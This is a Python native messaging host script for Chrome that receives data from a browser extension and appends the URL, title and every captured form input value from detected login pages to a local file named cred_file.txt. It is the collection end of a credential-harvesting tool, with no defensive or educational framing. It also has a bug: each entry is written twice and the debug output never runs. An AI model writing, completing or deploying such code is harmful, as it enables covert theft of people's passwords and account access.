import sys
import json
import struct
import os

OUTPUT_PATH = "cred_file.txt"
PROCESS_NAME = "chrome.exe"  # Optional: fixed or detect dynamically

def read_message():
    raw_length = sys.stdin.buffer.read(4)
    if not raw_length:
        return None
    message_length = struct.unpack('I', raw_length)[0]
    message = sys.stdin.buffer.read(message_length).decode('utf-8')
    return json.loads(message)

print("[DEBUG] Native Messaging Host Started", flush=True)


def write_to_file(data):
    with open(OUTPUT_PATH, 'a', encoding='utf-8') as f:
        f.write("\n==================== LOGIN PAGE DETECTED ====================\n")
        f.write(f"Process Name   : {PROCESS_NAME}\n")
        f.write(f"Window Title   : {data.get('title', 'Unknown')}\n")
        f.write(f"URL            : {data.get('url', 'N/A')}\n\n")
        f.write("[Captured Inputs]\n")
        for field in data.get('fields', []):
            f.write(f"- {field['type'].capitalize():<8}: {field['value']}\n")
        f.write(f"\nTimestamp     : {data.get('timestamp')}\n")
        f.write("============================================================\n")

while True:
    incoming = read_message()
    if incoming:
        write_to_file(incoming)
        if write_to_file(incoming):
            print("\n[DEBUG] Received from Extension:")
            print(json.dumps(incoming, indent=4))
            print("-" * 60, flush=True)
